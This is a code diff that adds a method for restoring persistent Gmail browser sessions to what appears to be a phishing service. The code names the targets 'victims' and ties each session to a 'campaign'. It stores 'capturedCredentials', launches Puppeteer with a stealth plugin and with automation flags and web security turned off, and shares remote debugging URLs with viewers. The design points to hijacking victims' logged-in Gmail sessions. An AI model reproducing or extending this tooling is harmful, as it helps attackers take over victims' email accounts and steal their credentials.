@@ -171,6 +171,132 @@ class GmailBrowserService extends EventEmitter {
     });
   }
 
+  /**
+   * Restore an existing Gmail session from persistent browser profile
+   */
+  async restoreGmailSession(sessionToken, campaignId, userInfo = {}) {
+    try {
+      console.log(`🔄 Restoring Gmail browser session: ${sessionToken}`);
+
+      // Check if session is already active
+      if (this.activeSessions.has(sessionToken)) {
+        console.log(`✅ Session already active: ${sessionToken}`);
+        return this.getSessionInfo(sessionToken);
+      }
+
+      // Create temp directory if it doesn't exist
+      const fs = require('fs');
+      const path = require('path');
+      const sessionDir = `./temp/browser-sessions/${sessionToken}`;
+      
+      // Check if persistent session directory exists
+      if (!fs.existsSync(sessionDir)) {
+        console.log(`⚠️ No persistent session found for ${sessionToken}, creating new session`);
+        return await this.createGmailSession(sessionToken, campaignId, userInfo);
+      }
+
+      console.log(`📁 Found persistent session directory: ${sessionDir}`);
+
+      // Get victim's screen dimensions from userInfo or use defaults
+      let victimScreenWidth = userInfo.screenWidth || 1920;
+      let victimScreenHeight = userInfo.screenHeight || 1080;
+      
+      console.log(`📐 Restoring browser with dimensions: ${victimScreenWidth}x${victimScreenHeight}`);
+
+      // Enhanced browser options for restoration
+      const browserOptions = {
+        ...this.browserOptions,
+        userDataDir: sessionDir, // Use existing persistent session
+        executablePath: process.env.CHROME_PATH || undefined,
+        ignoreDefaultArgs: ['--enable-automation', '--enable-blink-features=AutomationControlled'],
+        defaultViewport: {
+          width: victimScreenWidth,
+          height: victimScreenHeight,
+          deviceScaleFactor: 1,
+          hasTouch: false,
+          isLandscape: victimScreenWidth > victimScreenHeight,
+          isMobile: false,
+        },
+        args: [
+          ...this.browserOptions.args,
+          `--window-size=${victimScreenWidth},${victimScreenHeight}`,
+          '--start-maximized',
+          '--disable-web-security',
+          '--disable-features=VizDisplayCompositor',
+          '--force-device-scale-factor=1',
+        ]
+      };
+
+      // Launch browser with existing session data
+      const puppeteerExtra = require('puppeteer-extra');
+      puppeteerExtra.use(this.stealthPlugin);
+      
+      const browser = await puppeteerExtra.launch(browserOptions);
+      console.log(`✅ Browser restored with existing session data`);
+
+      // Get all existing pages (tabs)
+      const pages = await browser.pages();
+      let page = pages[0]; // Use the first page
+
+      // If no pages or page is blank, navigate to Gmail
+      if (!page || page.url() === 'about:blank') {
+        if (!page) {
+          page = await browser.newPage();
+        }
+        // Try to navigate to the last known state or Gmail
+        await page.goto('https://mail.google.com', { 
+          waitUntil: 'domcontentloaded',
+          timeout: 15000 
+        });
+      }
+
+      // Store session data
+      const sessionData = {
+        sessionToken,
+        campaignId,
+        userInfo,
+        createdAt: new Date(),
+        isActive: true,
+        viewers: new Set(),
+        capturedCredentials: [],
+        pageHistory: [],
+        debuggingUrl: null,
+        isRestored: true // Mark as restored session
+      };
+
+      this.activeSessions.set(sessionToken, sessionData);
+      this.browsers.set(sessionToken, browser);
+      this.pages.set(sessionToken, page);
+
+      // Set up event listeners
+      await this.setupPageEventListeners(sessionToken, page);
+
+      // Get debugging URL
+      try {
+        sessionData.debuggingUrl = await this.getBrowserDebuggingUrl(browser);
+        console.log(`🔗 Restored session debugging URL: ${sessionData.debuggingUrl}`);
+      } catch (debugError) {
+        console.log(`⚠️ Could not get debugging URL for restored session: ${debugError.message}`);
+      }
+
+      console.log(`✅ Gmail browser session restored: ${sessionToken}`);
+      
+      return {
+        sessionToken,
+        debuggingUrl: sessionData.debuggingUrl,
+        status: 'active',
+        url: page.url(),
+        isRestored: true
+      };
+
+    } catch (error) {
+      console.error('Error restoring Gmail browser session:', error);
+      // Fallback to creating new session
+      console.log(`🔄 Falling back to creating new session for: ${sessionToken}`);
+      return await this.createGmailSession(sessionToken, campaignId, userInfo);
+    }
+  }
+
   generateBindUrl(sessionToken) {
     const trackingId = crypto.randomUUID();
     const baseUrl = process.env.BASE_URL || 'https://spaceform.ddns.net';
